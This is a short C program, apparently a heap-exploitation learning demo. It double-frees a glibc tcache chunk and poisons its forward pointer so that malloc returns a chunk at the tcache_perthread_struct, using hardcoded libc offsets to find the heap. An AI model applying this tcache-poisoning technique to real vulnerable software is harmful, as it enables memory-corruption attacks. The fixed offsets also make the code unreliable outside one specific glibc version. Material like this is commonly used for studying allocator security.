#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
size_t getheap()
{
    puts("getlibc");
    size_t libc_addr=puts-0x6dfe0;
    size_t* mp_72=libc_addr+0x3af2c0+0x8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{
    size_t* chunk1=malloc(0x10);
    free(chunk1);
    free(chunk1);
    size_t* chunk2=malloc(0x10);
    size_t* heapbase=chunk2[0]-0x260; //chunk header
    chunk2[0]=heapbase;
    malloc(0x10);
    size_t* destchunk=malloc(0x10);
    printf("tcache_perthread_struct 0x%p\n",getheap());
    printf("destchunk 0x%p\n",destchunk);

}